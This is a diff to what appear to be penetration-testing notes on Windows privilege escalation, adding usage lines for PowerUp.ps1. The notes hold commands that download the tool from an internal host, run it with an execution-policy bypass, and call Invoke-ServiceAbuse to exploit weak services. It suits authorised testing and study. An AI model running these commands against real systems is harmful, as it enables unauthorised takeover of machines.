@@ -6,7 +6,8 @@ Example Usage: .\winPEASx64.exe | tee output.txt
 PowerUp.ps1  
 Description: PS script for misconfigs (weak services, paths).  
 Curl Command: curl http://192.168.1.2/PowerUp.ps1 -o C:\Users\Public\PowerUp.ps1  
-Example Usage: powershell -ep bypass -f .\PowerUp.ps1  
+Example Usage: powershell -ep bypass -f .\PowerUp.ps1  or 
+Example Usage2: `Import-Module .\powerup.ps1` ->  `Invoke-AllChecks` or `Invoke-ServiceAbuse` for specifics.
 
 Seatbelt.exe  
 Description: .NET tool for security configs (policies, hotfixes).  
@@ -337,5 +338,5 @@ What to look for/do:
 
 Sample commands:
 - Upload winPEAS.exe: `.\winPEASany.exe quiet servicesinfo creds` (focus sections).
-- PowerUp.ps1: `Invoke-AllChecks` or `Invoke-ServiceAbuse` for specifics.
+- PowerUp.ps1:  `Import-Module .\powerup.ps1` ->  `Invoke-AllChecks` or `Invoke-ServiceAbuse` for specifics.
 - If PS blocked, use cmd versions or Sherlock.ps1 for quick vuln scans.
